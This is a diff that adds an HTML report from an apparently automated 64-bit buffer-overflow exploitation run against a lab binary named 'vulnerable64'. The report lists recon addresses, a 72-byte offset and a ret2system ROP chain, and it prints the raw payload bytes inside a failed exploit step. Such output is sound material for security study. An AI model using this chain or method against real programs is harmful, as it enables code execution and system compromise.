@@ -1,0 +1,35 @@
+<!DOCTYPE html><html><head><title>BOF64 Report</title>
+<style>
+body { font-family: monospace; background:#111; color:#eee; padding:20px; }
+h1 { color:#ff5555; } h3 { color:#55ff55; border-bottom:1px solid #333; }
+pre { background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }
+</style></head><body>
+<h1>64-bit Buffer Overflow Report</h1>
+<p><b>Binary:</b> ./vulnerable64</p>
+<p><b>Arch:</b> amd64</p>
+<p><b>PIE:</b> False | <b>Canary:</b> False | <b>NX:</b> None</p>
+<p><b>Timestamp:</b> 2026-10-25T18:31:40.620617</p>
+<p><b>Findings:</b> 0</p>
+<ul></ul>
+<h3>recon</h3><pre>{
+  "system_plt": "0x401094",
+  "bin_sh": "0x404048",
+  "pop_rdi_ret": "0x4012b3"
+}</pre><h3>fuzz</h3><pre>{
+  "crash_size": 64
+}</pre><h3>offset</h3><pre>{
+  "offset": 72,
+  "method": "fallback"
+}</pre><h3>control_rip</h3><pre>{
+  "error": "Could not find core file for pid 4554"
+}</pre><h3>rop_chain</h3><pre>{
+  "offset": 72,
+  "padding": 72,
+  "pop_rdi": "0x4012b3",
+  "bin_sh": "0x404048",
+  "system": "0x401094",
+  "total_length": 96
+}</pre><h3>exploit</h3><pre>{
+  "error": "Inappropriate nulls in argv[1]: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xb3\\x12@\\x00\\x00\\x00\\x00\\x00H@@\\x00\\x00\\x00\\x00\\x00\\x94\\x10@\\x00\\x00\\x00\\x00\\x00'"
+}</pre>
+</body></html>
